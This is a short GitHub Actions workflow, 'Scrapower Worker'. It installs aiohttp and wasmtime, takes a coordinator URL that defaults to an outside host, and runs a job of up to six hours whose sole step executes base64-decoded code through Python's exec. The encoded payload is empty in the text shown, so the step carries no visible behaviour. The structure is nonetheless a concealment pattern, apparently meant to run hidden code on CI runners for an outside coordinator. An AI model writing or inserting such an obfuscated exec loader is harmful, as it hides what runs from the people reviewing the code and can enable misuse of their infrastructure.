name: Scrapower Worker
on:
  workflow_dispatch:
    inputs:
      coordinator_url:
        description: 'Coordinator URL'
        required: true
        default: 'https://scrapower.talos-int.com'
      worker_id:
        description: 'Worker ID'
        required: false
        default: 'gh-actions'
jobs:
  worker:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'
      - name: Install
        run: pip install aiohttp wasmtime
      - name: Run Worker
        env:
          C: ${{ inputs.coordinator_url }}
          W: ${{ inputs.worker_id }}
        run: python -c "import base64;exec(base64.b64decode('').decode())"
